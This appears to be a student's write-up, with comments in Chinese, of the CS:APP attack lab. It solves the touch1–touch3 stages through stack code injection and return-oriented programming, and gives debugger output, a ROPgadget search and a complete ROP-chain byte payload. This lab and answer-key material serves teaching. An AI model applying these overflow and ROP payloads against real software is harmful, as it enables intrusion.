## touch1
```
pwndbg> -l kaaa
40
```
缓冲区大小为40，直接塞数据

## touch2
```
─────[ STACK ]
00:0000│ rax rsp  0x5561dc78 ◂— 0x31 /* '1' */
01:0008│          0x5561dc80 ◂— 0
... ↓
04:0020│          0x5561dc98 —▸ 0x55586000 ◂— 0
05:0028│          0x5561dca0 —▸ 0x401976 (test+14) ◂— mov    edx, eax
06:0030│          0x5561dca8 ◂— 9 /* '\t' */
07:0038│          0x5561dcb0 —▸ 0x401f24 (launch+112) ◂— cmp    dword ptr [rip + 0x2025bd], 0
─────[ BACKTRACE ]
 ► f 0           4017b4 getbuf+12
   f 1           401976 test+14
   f 2           401f24 launch+112

```
得到栈顶的值，用来写shellcode，具体流程：
getbuf -> return -> (0x5561dc78) movq $0x59b997fa, %rdi -> pushq -> return

## touch3
后面函数重新申请栈空间，如果把cookie写在之前getbuf函数申请的栈空间中，会被后面函数覆盖。写到返回地址之后即可。
具体流程：
getbuf -> return -> (0x5561dc78) movq $0x5561dca8, %rdi -> pushq -> return
0x5561dca9中写入转化为字符串的cookie

## ROP-touch2
借助ROPgadget
`root@ctf:/ctf/work/Pwn_study/attacklab# ROPgadget --binary ctarget --only 'pop|ret' | grep 'rdi'
0x000000000040141b : pop rdi ; ret`
构造流程：return -> (0x40141b) pop rdi ; return -> touch2

## ROP-touch3
借助farm.c寻找rop，rop链比较绕
```
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
aa aa aa aa aa aa aa aa
ad 1a 40 00 00 00 00 00 // movq %rsp, %rax
c5 19 40 00 00 00 00 00 // movq %rax, %rdi 
ab 19 40 00 00 00 00 00 // gpopq %rax 
48 00 00 00 00 00 00 00 // offset
42 1a 40 00 00 00 00 00 // movl %eax, %edx 
34 1a 40 00 00 00 00 00 // movl %edx, %ecx 
13 1a 40 00 00 00 00 00 // movl %ecx, %esi 
d6 19 40 00 00 00 00 00 // add_xy 
c5 19 40 00 00 00 00 00 // movq %rax, %rdi 
fa 18 40 00 00 00 00 00 // touch3 
35 39 62 39 39 37 66 61 
00
```
